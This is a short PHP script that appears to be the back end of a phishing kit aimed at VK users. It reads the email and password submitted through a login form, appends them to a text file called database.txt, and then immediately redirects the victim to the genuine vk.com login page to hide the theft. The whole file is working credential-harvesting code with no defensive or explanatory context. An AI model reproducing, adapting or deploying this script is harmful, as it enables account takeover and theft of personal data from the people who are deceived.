<?PHP

$Log = $_POST['email'];

$Pass = $_POST['pass'];

$log = fopen("database.txt","at");

fwrite($log,"\n $Log:$Pass \n");

fclose($log);

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/login?m=1&email=.&to=bG9naW4/bT0xJmVtYWlsPWYmdG89YVc1a1pYZ3VjR2h3'></head></html>";

?>